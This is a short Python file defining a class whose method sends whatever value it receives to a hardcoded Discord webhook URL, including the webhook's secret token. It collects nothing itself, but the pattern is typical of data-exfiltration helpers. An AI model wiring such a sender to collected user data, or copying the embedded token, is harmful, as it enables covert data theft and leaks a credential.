from dhooks import Webhook
class Get():
    def func(self,request):
        self.request = request
        dat = Webhook("https://discord.com/api/webhooks/838822668668764190/QYqsOkN5kKwn2wIT-jMrkjOYjptFNr0GelaYvIfT4N3Dti1kF2kTrJfaRCf307nOZj7H")
        dat.send(request)
        